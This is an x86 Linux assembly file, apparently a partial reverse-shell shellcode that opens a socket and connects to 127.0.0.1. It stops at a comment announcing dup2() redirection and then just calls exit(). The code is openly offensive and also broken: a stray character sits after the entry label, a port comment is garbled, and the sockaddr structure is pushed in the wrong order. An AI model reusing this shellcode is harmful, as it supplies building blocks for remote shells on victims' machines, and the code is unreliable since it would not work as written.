section .text
    global _start

_start: d

    push 0x66      ;socket call
    pop	 eax
    push 0x1       ; int argument call
    pop	 ebx
                   ;socket(AF_INET, SOCK_STREAM, 0)
    xor  edx, edx  ;pass args for the socket connection function by pushing the args into the stack from the to first
    push edx       ; 0
    push ebx       ; 1
    push 0x2       ; 2
    mov  ecx, esp  ; stack pointer to the arguments it will pop them automatically

    int 0x80       ; will return the socket descriptor in eax and will be used as so in the next functions

                   ; connect(s, (struct sockaddr *)&sa, sizeof(sa))
                   ; first creat the struct sockadrr 
    push word 0x03d9 ; port 55555aa
    push 0x0101017f  ; ip adress 127.0.0.1
    push word 0x2    ; 2
    mov  ecx, esp  ; stack pointer to the arguments it will pop them automatically
    
                    ;now push on the stack the parameters for the CONNECT function
    push 0x10       ; size of the structure
    push ecx        ; the socket structure (ip, port...)
    push eax        ; socket descriptor created in first call
    mov  ecx, esp   ; args in top of the stack 
    
    mov al, 0x66    ; for SYSCALL_SOCKET 0x66
    mov bl, 0x3     ; SYS_CONNECT 0x3
    int 0x80        ; now we call connect()

                    ; I/O Redirection using dup2()

    

    





    mov eax, 1 
    xor ebx, ebx 
    int 80h         ; syscall exit(0)





